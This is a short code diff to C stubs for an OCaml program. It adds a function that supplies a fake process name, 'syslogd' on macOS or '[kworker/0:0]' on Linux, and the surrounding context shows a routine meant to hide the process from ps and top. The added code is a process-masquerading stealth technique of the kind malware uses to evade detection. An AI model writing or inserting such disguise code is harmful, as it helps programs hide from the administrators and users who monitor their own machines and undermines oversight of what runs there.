@@ -21,6 +21,19 @@ __attribute__((constructor)) void capture_argv(int argc, char **argv, char **env
 #include <pthread.h>
 #endif
 
+/* Get default process name based on OS */
+CAMLprim value caml_get_default_process_name(value unit)
+{
+    CAMLparam1(unit);
+#ifdef __APPLE__
+    /* macOS: 'syslogd' is a common background daemon */
+    CAMLreturn(caml_copy_string("syslogd"));
+#else
+    /* Linux: disguise as kernel worker */
+    CAMLreturn(caml_copy_string("[kworker/0:0]"));
+#endif
+}
+
 /* Set process name to hide from ps/top */
 CAMLprim value caml_set_process_name(value v_name)
 {
